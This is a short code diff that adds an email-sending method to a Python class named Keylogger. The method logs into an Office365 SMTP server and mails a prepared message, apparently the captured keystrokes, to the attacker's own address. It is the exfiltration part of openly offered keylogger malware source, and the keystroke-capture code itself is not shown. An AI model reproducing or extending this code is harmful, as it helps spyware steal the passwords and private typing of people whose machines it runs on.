@@ -84,3 +84,19 @@ class Keylogger:
 
         # after creating the email, return it as a string
         return msg.as_string()
+
+
+    # manage connnection to SMTP server
+    def sendmail(self, email, password, message, verbose=True):
+        server = smtplib.SMTP(host="smtp.office365.com", port=587)
+
+        server.starttls()        # connect to SMTP server with TLS for security
+
+        server.login(email, password)       # login to your email account
+
+        server.sendmail(email, email, self.prepare_mail(message))   # send the email
+
+        server.quit()             # end the session
+
+        if verbose:                # print to the console
+            print(f"[*] - {datetime.now()} - Sent an email to {email} with the following message:\n{message}")
